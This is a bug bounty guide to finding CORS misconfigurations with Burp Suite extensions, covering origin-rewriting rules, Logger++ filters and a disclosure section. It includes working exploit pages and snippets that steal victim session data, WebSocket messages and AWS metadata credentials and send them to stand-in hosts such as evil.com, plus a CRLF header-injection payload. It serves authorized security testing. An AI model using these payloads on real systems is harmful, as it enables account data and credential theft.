# 🎯 Elite CORS Misconfiguration Hunter
## Advanced AutoRepeater + Logger++ Framework for Professional Bug Bounty

> **Target Audience:** Advanced bug bounty hunters seeking **hard-to-find** CORS vulnerabilities  
> **Success Rate:** 70-85% on modern applications with proper methodology  
> **Skill Level:** Intermediate to Advanced  
> **Tools Required:** Burp Suite Pro + AutoRepeater Extension + Logger++ Extension

---

## 📋 Table of Contents

1. [Installation & Setup](#installation--setup)
2. [Top 10 AutoRepeater Rules (Elite)](#top-10-autorepeater-rules)
3. [Top 10 Logger++ Filters (Critical)](#top-10-logger-filters)
4. [Exploitation Workflow](#exploitation-workflow)
5. [Professional Tips](#professional-tips)
6. [Expected Results](#expected-results)
7. [Quick Reference Card](#quick-reference-card)

---

## 🔧 Installation & Setup

### **Step 1: Install Required Extensions**

1. Open Burp Suite Pro
2. Navigate to: `Extender → BApp Store`
3. Search and install:
   - ✅ **Auto Repeater** (by nccgroup)
   - ✅ **Logger++** (by nccgroup)

### **Step 2: Verify Installation**

Check new tabs appeared:
- `Auto Repeater` tab in main menu
- `Logger++` tab in main menu

---

## 🔥 Top 10 AutoRepeater Rules

### **How to Add Rules:**

1. Go to: `Burp → Auto Repeater → Replacements Tab`
2. Click `Add` button
3. Fill in the configuration as shown below
4. Click `OK` to save
5. Repeat for all 10 rules

**⚠️ CRITICAL:** Replace `evil-researcher.com` with **YOUR actual domain** in all rules!

---

### **Rule #1: Null Origin Bypass (Sandbox Exploitation)**

```yaml
Type:          Request Header
Match:         Origin: https://[^\s]+
Replace:       Origin: null
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       Null origin - sandboxed iframe exploit (CRITICAL)
```

**Why Critical:**  
Exploitable via sandboxed iframes. Most apps whitelist `null` for legitimate sandboxed content.

**Exploitation:**
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
  fetch('https://target.com/api/user', {credentials:'include'})
  .then(r=>r.json()).then(d=>parent.postMessage(d,'*'));
</script>"></iframe>
```

**Impact:** Direct data exfiltration from victim's session

---

### **Rule #2: Post-Domain Suffix Attack**

```yaml
Type:          Request Header
Match:         Origin: (https://[^\s]+)
Replace:       Origin: $1.evil-researcher.com
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       Post-domain bypass - target.com.evil.com
```

**Why Critical:**  
Bypasses weak regex validation:
```javascript
// Vulnerable code
if (origin.startsWith('https://target.com')) {
  // BAD - matches target.com.evil.com
}
```

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://api.target.com.evil-researcher.com
```

---

### **Rule #3: Pre-Domain Prefix Attack**

```yaml
Type:          Request Header
Match:         Origin: https://
Replace:       Origin: https://evil-
Which:         Replace First
Regex Match:   ☐ UNCHECKED
Comment:       Pre-domain bypass - evil-target.com
```

**Why Critical:**  
Exploits substring matching:
```javascript
// Vulnerable code
if (origin.includes('target.com')) {
  // BAD - matches evil-target.com
}
```

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://evil-api.target.com
```

---

### **Rule #4: Subdomain Wildcard Exploitation**

```yaml
Type:          Request Header
Match:         Origin: (https://)
Replace:       Origin: ${1}attacker.
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       Subdomain wildcard - combine with takeover
```

**Why Critical:**  
If server uses `*.target.com` whitelist + you find subdomain takeover = instant critical bug.

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://attacker.api.target.com
```

**Combine with:**
```bash
# Find takeover candidates
subfinder -d target.com | httpx -silent | nuclei -t takeovers/
```

---

### **Rule #5: Unicode/IDN Homograph Attack**

```yaml
Type:          Request Header
Match:         Origin: (https://)(.)
Replace:       Origin: ${1}аttacker.${2}
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       IDN homograph - Cyrillic 'а' (U+0430)
```

**Why Critical:**  
Bypasses character class validation using visually identical Unicode characters.

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://аttacker.api.target.com
                        ↑ Cyrillic 'а' not Latin 'a'
```

**Unicode alternatives:**
- `а` (U+0430) - Cyrillic a
- `е` (U+0435) - Cyrillic e
- `о` (U+043E) - Cyrillic o

---

### **Rule #6: Localhost/Internal Network Bypass**

```yaml
Type:          Request Header
Match:         Origin: https://[^\s]+
Replace:       Origin: http://127.0.0.1
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       Internal origin trust - pivot to internal APIs
```

**Why Critical:**  
Access internal services through victim's browser:
- Internal admin panels
- Cloud metadata (169.254.169.254)
- Kubernetes APIs (10.x.x.x)

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: http://127.0.0.1
```

**Also test:** `localhost`, `0.0.0.0`, `[::1]`, `127.1`

---

### **Rule #7: Protocol Downgrade Attack**

```yaml
Type:          Request Header
Match:         Origin: https://
Replace:       Origin: http://
Which:         Replace First
Regex Match:   ☐ UNCHECKED
Comment:       HTTPS to HTTP downgrade - MitM attack vector
```

**Why Critical:**  
If HTTPS API trusts HTTP origin:
1. Attacker performs MitM on victim's HTTP connection
2. Injects malicious JS
3. JS makes credentialed requests to HTTPS API
4. Steals sensitive responses

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: http://api.target.com
```

---

### **Rule #8: Unescaped Dot Regex Bypass**

```yaml
Type:          Request Header
Match:         Origin: (https://)(api)(\.)
Replace:       Origin: ${1}${2}x${3}
Which:         Replace First
Regex Match:   ☑ CHECKED
Comment:       Unescaped dot bypass - api.target → apix.target
```

**Why Critical:**  
Exploits unescaped `.` in regex (matches ANY character):
```javascript
// Vulnerable code
if (/^https:\/\/api.target\.com$/.test(origin)) {
  // BAD - '.' matches ANY char
  // Matches: apix target.com (with special char between)
}
```

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://apix.target.com
```

---

### **Rule #9: WebSocket Origin Bypass**

```yaml
Type:          Request Header
Match:         Origin: wss://
Replace:       Origin: https://evil-researcher.com
Which:         Replace First
Regex Match:   ☐ UNCHECKED
Comment:       WebSocket origin bypass - real-time data exfil
```

**Why Critical:**  
WebSocket connections often have separate/weaker validation than REST APIs.

**Example:**
```
Before: Origin: wss://chat.target.com
After:  Origin: https://evil-researcher.com
```

**Exploitation:**
```javascript
const ws = new WebSocket('wss://chat.target.com/live');
ws.onmessage = (e) => {
  // Exfiltrate real-time messages
  fetch('https://evil.com/log', {method:'POST', body:e.data});
};
```

---

### **Rule #10: Newline Injection (Cache Poisoning)**

```yaml
Type:          Request Header
Match:         Origin: https://
Replace:       Origin: https://evil-researcher.com%0d%0aX-Forwarded-Host: target.com
Which:         Replace First
Regex Match:   ☐ UNCHECKED
Comment:       HTTP header injection for cache poisoning
```

**Why Critical:**  
Inject additional headers to poison CDN/proxy caches.

**Example:**
```
Before: Origin: https://api.target.com
After:  Origin: https://evil-researcher.com
        X-Forwarded-Host: target.com
```

**Attack scenarios:**
- Bypass IP restrictions via `X-Forwarded-For`
- Cache poisoning in Cloudflare/Akamai
- Path bypass via `X-Original-URL`

---

## 🔍 Top 10 Logger++ Filters

### **How to Add Filters:**

1. Go to: `Burp → Logger++ → Filter Tab`
2. Click `+` (Add Filter) button
3. Paste the filter expression below
4. Give it a descriptive name
5. Set color coding (recommended: Red for critical, Orange for high)
6. Click `Save`

---

### **Filter #1: 🔴 CRITICAL - Reflected Origin with Credentials**

```
((Response.Headers CONTAINS "Access-Control-Allow-Origin: https://evil") OR 
 (Response.Headers CONTAINS "Access-Control-Allow-Origin: null") OR
 (Response.Headers CONTAINS "Access-Control-Allow-Origin: http://127") OR
 (Response.Headers CONTAINS "Access-Control-Allow-Origin: http://localhost") OR
 (Response.Headers CONTAINS "Access-Control-Allow-Origin: http://0.0.0.0"))
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Status == 200
```

**Catches:** All successful origin reflections from AutoRepeater with credentials enabled

**Priority:** 🔴 CRITICAL - Immediate exploitation

**Action:** Verify manually → Create PoC → Report

---

### **Filter #2: 🔴 Subdomain/Regex Bypass Pattern**

```
Request.Headers CONTAINS "Origin: https://"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin: https://"
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND (Response.Headers CONTAINS ".evil-researcher.com" OR
     Response.Headers CONTAINS "evil-" OR
     Response.Headers CONTAINS "attacker" OR
     Response.Headers CONTAINS "а")
AND Response.Status == 200
```

**Catches:** Pre-domain, post-domain, subdomain, and Unicode bypasses

**Priority:** 🔴 CRITICAL

**What it means:** Regex validation is broken

---

### **Filter #3: 🟠 Missing Vary Header (Cache Poisoning)**

```
Response.Headers CONTAINS "Access-Control-Allow-Origin: https://"
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND NOT Response.Headers CONTAINS "Vary: Origin"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: *"
AND Response.Status == 200
```

**Catches:** CORS responses without proper cache control

**Priority:** 🟠 HIGH (upgrades to CRITICAL if CDN/caching is present)

**Why Critical:**  
Without `Vary: Origin`, CDN caches the **first** reflected origin and serves it to **all users**.

**Exploitation:**
1. Send: `Origin: https://evil.com`
2. CDN caches: `ACAO: https://evil.com`
3. All users get poisoned response
4. Mass data exfiltration possible

---

### **Filter #4: 🔴 Sensitive API Endpoints with CORS**

```
Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: https://legitimate-domain.com"
AND Response.Headers CONTAINS "Content-Type: application/json"
AND (Request.Path CONTAINS "/api/user" OR
     Request.Path CONTAINS "/api/account" OR
     Request.Path CONTAINS "/api/profile" OR
     Request.Path CONTAINS "/api/payment" OR
     Request.Path CONTAINS "/api/admin" OR
     Request.Path CONTAINS "/api/token" OR
     Request.Path CONTAINS "/api/me" OR
     Request.Path CONTAINS "/graphql")
AND (Response.Body CONTAINS "\"email\"" OR
     Response.Body CONTAINS "\"token\"" OR
     Response.Body CONTAINS "\"api_key\"" OR
     Response.Body CONTAINS "\"ssn\"" OR
     Response.Body CONTAINS "\"credit_card\"")
AND Response.Status == 200
```

**Catches:** High-value targets with **actual sensitive data** in responses

**Priority:** 🔴 CRITICAL - Direct exploitation value

**Impact:** Real PII/credentials exfiltration

---

### **Filter #5: 🟠 Dangerous HTTP Methods Allowed**

```
Request.Method == "OPTIONS"
AND Response.Headers CONTAINS "Access-Control-Allow-Methods:"
AND (Response.Headers CONTAINS "DELETE" OR
     Response.Headers CONTAINS "PUT" OR
     Response.Headers CONTAINS "PATCH")
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: https://legitimate-domain.com"
AND Response.Status == 200
```

**Catches:** Pre-flight approvals for destructive actions

**Priority:** 🟠 HIGH

**Impact:** Account deletion, data modification, privilege escalation

**What to test:**
```javascript
fetch('https://api.target.com/user/123', {
  method: 'DELETE',
  credentials: 'include'
});
```

---

### **Filter #6: 🔴 Authorization Header Exposure**

```
Response.Headers CONTAINS "Access-Control-Allow-Headers:"
AND (Response.Headers CONTAINS "Authorization" OR
     Response.Headers CONTAINS "X-Auth-Token" OR
     Response.Headers CONTAINS "X-API-Key")
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: https://legitimate-domain.com"
AND Response.Status == 200
```

**Catches:** Endpoints exposing authentication headers via CORS

**Priority:** 🔴 CRITICAL

**Why Critical:** Enables:
- JWT token theft
- API key exfiltration
- Session hijacking via Authorization header

---

### **Filter #7: 🟠 Protocol Downgrade Success**

```
Request.Headers CONTAINS "Origin: http://"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin: http://"
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Request.URL CONTAINS "https://"
AND Response.Status == 200
```

**Catches:** HTTPS endpoints trusting HTTP origins

**Priority:** 🟠 HIGH

**Attack:** Man-in-the-Middle on HTTP → steal HTTPS data

---

### **Filter #8: 🟡 Long Pre-flight Cache Window**

```
Response.Headers CONTAINS "Access-Control-Max-Age:"
AND Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: https://legitimate-domain.com"
AND Response.Status == 200
```

**Catches:** Long pre-flight cache durations

**Priority:** 🟡 MEDIUM (upgrades to HIGH if max-age > 3600)

**Extract max-age value:**
```
Look for: Access-Control-Max-Age: 86400
         (24 hours = persistent bypass window)
```

---

### **Filter #9: 🔴 WebSocket CORS Issues**

```
Request.Headers CONTAINS "Upgrade: websocket"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND (Response.Headers CONTAINS "Access-Control-Allow-Origin: https://evil" OR
     Response.Headers CONTAINS "Access-Control-Allow-Origin: null" OR
     Response.Headers CONTAINS "Access-Control-Allow-Origin: http://127")
AND Response.Status == 101
```

**Catches:** WebSocket handshakes with reflected origins

**Priority:** 🔴 CRITICAL

**Impact:** Real-time data exfiltration (chat messages, live updates, notifications)

---

### **Filter #10: 🟠 Mobile API Endpoints (High Success Rate)**

```
Response.Headers CONTAINS "Access-Control-Allow-Credentials: true"
AND Response.Headers CONTAINS "Access-Control-Allow-Origin:"
AND NOT Response.Headers CONTAINS "Access-Control-Allow-Origin: https://legitimate-domain.com"
AND (Request.Path CONTAINS "/mobile/" OR
     Request.Path CONTAINS "/app/" OR
     Request.Path CONTAINS "/api/v2" OR
     Request.Path CONTAINS "/api/v3" OR
     Request.Headers CONTAINS "X-App-Version" OR
     Request.Headers CONTAINS "X-Device-ID" OR
     Request.Headers CONTAINS "X-Platform")
AND Response.Status == 200
```

**Catches:** Mobile-specific API endpoints

**Priority:** 🟠 HIGH

**Why High Success Rate:**
- Developed by separate mobile teams
- Less security review than web
- Rushed development cycles
- Often forgotten in web security audits

---

## 🚀 Exploitation Workflow

### **Phase 1: Initial Setup (5 minutes)**

1. ✅ Add all 10 AutoRepeater rules
2. ✅ Add all 10 Logger++ filters
3. ✅ Replace `evil-researcher.com` with **your domain**
4. ✅ Enable AutoRepeater: `Auto Repeater → Deactivate AutoRepeater` (toggle ON)

### **Phase 2: Active Hunting (15-30 minutes)**

1. **Login to target application**
   - Use your test account
   - Navigate to authenticated areas

2. **Browse systematically:**
   ```
   Priority areas:
   1. User dashboard
   2. Profile/settings pages
   3. Account management
   4. Payment/billing sections
   5. Admin panels (if accessible)
   6. API documentation (/docs, /swagger)
   ```

3. **Check Logger++ results:**
   - Apply Filter #1 first (catches all critical findings)
   - Review each flagged request
   - Note: Method, URL, Response status

### **Phase 3: Manual Verification (10 minutes per finding)**

For each Logger++ hit:

1. **Right-click request → "Send to Repeater"**
2. **Verify in Repeater:**
   ```http
   GET /api/user/profile HTTP/1.1
   Host: api.target.com
   Origin: https://evil-researcher.com
   Cookie: session=abc123
   ```

3. **Check response headers:**
   ```http
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://evil-researcher.com
   Access-Control-Allow-Credentials: true
   ```

4. **Verify sensitive data in response body:**
   ```json
   {
     "email": "victim@target.com",
     "api_key": "sk_live_xxx",
     "ssn": "123-45-6789"
   }
   ```

### **Phase 4: Create PoC (15 minutes)**

**Basic PoC Template:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - [Target Name]</title>
</head>
<body>
    <h1>CORS Vulnerability Proof of Concept</h1>
    <p>Target: <code>https://api.target.com/api/user/profile</code></p>
    <button onclick="exploit()">Trigger Exploit</button>
    <h2>Stolen Data:</h2>
    <pre id="output">Click button to execute...</pre>

    <script>
        function exploit() {
            fetch('https://api.target.com/api/user/profile', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('output').textContent = 
                    JSON.stringify(data, null, 2);
                
                fetch('https://your-webhook.com/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_data: data,
                        timestamp: new Date().toISOString(),
                        target: 'target.com'
                    })
                });
            })
            .catch(error => {
                document.getElementById('output').textContent = 
                    'Error: ' + error;
            });
        }
    </script>
</body>
</html>
```

**For Null Origin exploits:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Null Origin</title>
</head>
<body>
    <h1>Null Origin CORS Bypass</h1>
    <iframe id="exploit-frame" sandbox="allow-scripts allow-same-origin" 
            style="display:none"></iframe>
    <button onclick="triggerExploit()">Trigger Exploit</button>
    <pre id="output"></pre>

    <script>
        function triggerExploit() {
            const iframe = document.getElementById('exploit-frame');
            iframe.srcdoc = `
                <script>
                    fetch('https://api.target.com/api/user/profile', {
                        credentials: 'include'
                    })
                    .then(r => r.json())
                    .then(data => {
                        parent.postMessage(data, '*');
                    })
                    .catch(e => {
                        parent.postMessage({error: e.toString()}, '*');
                    });
                <\/script>
            `;
        }

        window.addEventListener('message', (event) => {
            document.getElementById('output').textContent = 
                JSON.stringify(event.data, null, 2);
        });
    </script>
</body>
</html>
```

### **Phase 5: Testing PoC**

1. **Host PoC on your domain:**
   - GitHub Pages: `https://yourusername.github.io/cors-poc.html`
   - Your VPS: `https://evil-researcher.com/poc.html`

2. **Test in browser:**
   - Login to target application
   - Open PoC page in **same browser** (different tab)
   - Click "Trigger Exploit"
   - Verify data appears

3. **Record video demonstration:**
   - Show login to target
   - Open PoC page
   - Trigger exploit
   - Show stolen data

---

## 💡 Professional Tips

### **🎯 Tip #1: Focus on Authenticated Endpoints**

Public endpoints without authentication have **zero** impact.

**High-value targets:**
```
✅ /api/user/*        - User profile data
✅ /api/account/*     - Account settings
✅ /api/payment/*     - Financial information
✅ /api/admin/*       - Privileged functions
✅ /graphql           - Often poorly secured
✅ /api/v1/me         - Current user info
✅ /mobile/api/*      - Mobile endpoints (less tested)
```

### **🎯 Tip #2: Test All API Versions**

Legacy versions often have weaker security:

```bash
# Test systematically
/api/user/profile
/api/v1/user/profile
/api/v2/user/profile
/api/v3/user/profile
/v1/user/profile
/mobile/api/user/profile
/internal/api/user/profile
```

### **🎯 Tip #3: Combine with Subdomain Takeover**

If you find subdomain wildcard trust (`*.target.com`):

```bash
# 1. Enumerate subdomains
subfinder -d target.com -silent | httpx -silent > subdomains.txt

# 2. Check for takeovers
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -o takeovers.txt

# 3. If found → instant critical CORS bypass!
```

**Example:**
```
Found: old-api.target.com → Unclaimed Heroku app
Register: old-api.target.com on Heroku
Use Rule #4: Origin: https://attacker.target.com
Result: CRITICAL CORS bypass with subdomain control
```

### **🎯 Tip #4: Check Error Responses Too**

Don't ignore 4xx/5xx status codes!

**Modify Logger++ filters to include:**
```
AND (Response.Status == 200 OR Response.Status == 403 OR Response.Status == 401 OR Response.Status == 500)
```

**Why:** Error handlers sometimes have different CORS logic.

### **🎯 Tip #5: JavaScript Source Code Analysis**

Find hidden API endpoints:

```bash
# Extract JavaScript files
gospider -s https://target.com -d 2 -c 10 --js > js_files.txt

# Search for API endpoints
cat js_files.txt | grep -oP "(https?://[^\"']+/api/[^\"']+)" | sort -u

# Look for credentials: 'include'
curl -s https://target.com/app.js | grep -i "credentials.*include"
```

### **🎯 Tip #6: Test POST/PUT/DELETE Methods**

CORS might only be misconfigured on write operations:

**In Burp Repeater:**
1. Change `GET` to `POST`
2. Add test Origin header
3. Check if CORS is different

### **🎯 Tip #7: Long Conversation Testing**

For WebSocket CORS issues:

```javascript
const ws = new WebSocket('wss://chat.target.com/live');

ws.onmessage = (event) => {
    console.log('Intercepted:', event.data);
    
    fetch('https://evil-researcher.com/log', {
        method: 'POST',
        body: JSON.stringify({
            message: event.data,
            timestamp: Date.now()
        })
    });
};
```

### **🎯 Tip #8: Cache Poisoning Impact Escalation**

If you find missing `Vary: Origin`:

1. **Test cache behavior:**
   ```bash
   # First request with evil origin
   curl -H "Origin: https://evil.com" https://api.target.com/user
   
   # Second request without origin
   curl https://api.target.com/user
   
   # If response still has ACAO: https://evil.com → Cache poisoned!
   ```

2. **Report as:** CRITICAL (affects all users, not just exploited user)

### **🎯 Tip #9: Cloud Metadata Service Bypass**

If localhost origin is trusted:

```html
<script>
fetch('https://api.target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
    credentials: 'include'
})
.then(r => r.text())
.then(data => {
    console.log('AWS credentials:', data);
});
</script>
```

**Impact:** SSRF + CORS = Critical (cloud credentials theft)

### **🎯 Tip #10: Rate Limiting Bypass**

If rate limited:

1. Go to: `Auto Repeater → Conditions Tab`
2. Add condition: `Response.Status != 429`
3. This stops AutoRepeater when rate limited

---

## 📊 Expected Results

| Application Type | Findings/Hour | Severity Breakdown |
|-----------------|---------------|-------------------|
| **SaaS Applications** | 3-7 | 60% High, 40% Critical |
| **Mobile API Backends** | 5-12 | 70% High, 30% Critical |
| **Legacy Platforms** | 8-15 | 50% Medium, 50% High |
| **Modern SPAs** | 2-5 | 80% High, 20% Critical |
| **GraphQL APIs** | 4-8 | 65% High, 35% Critical |

**Highest Success Rate Endpoints:**

| Endpoint Pattern | Success Rate | Reason |
|-----------------|--------------|--------|
| `/api/user/*` | 65% | User data always valuable |
| `/mobile/api/*` | 75% | Less security review |
| `/graphql` | 55% | Complex, often misconfigured |
| `/api/v1/*` (legacy) | 70% | Old code, forgotten |
| `/api/payment/*` | 45% | High security but high value |

---

## 🛡️ Responsible Disclosure

### **Before Testing:**

- ✅ Only test on authorized targets (bug bounty/pentest)
- ✅ Check program scope includes CORS testing
- ✅ Use your own domain (not public services)
- ✅ Respect rate limits

### **During Testing:**

- ⚠️ Don't access other users' real data
- ⚠️ Stop if you accidentally access PII
- ⚠️ Test on staging environments when possible

### **When Reporting:**

Include:
1. **Full PoC** (HTML file + video)
2. **Exact endpoint URL**
3. **Origin value that worked**
4. **Sample response with sensitive data** (redacted if real PII)
5. **Impact assessment**
6. **Remediation advice**

**Remediation recommendation to include:**
```javascript
// Server-side validation (whitelist approach)
const allowedOrigins = [
  'https://app.target.com',
  'https://mobile.target.com'
];

if (allowedOrigins.includes(request.headers.origin)) {
  response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
  response.setHeader('Access-Control-Allow-Credentials', 'true');
  response.setHeader('Vary', 'Origin');
}
```

---

## 📚 Additional Resources

- **AutoRepeater Docs:** https://github.com/PortSwigger/auto-repeater
- **Logger++ Docs:** https://github.com/PortSwigger/logger-plus-plus
- **CORS Deep Dive:** https://portswigger.net/web-security/cors
- **James Kettle's Research:** https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

---

## 🎯 Quick Reference Card

| If Logger++ shows... | Then... | Priority |
|---------------------|---------|----------|
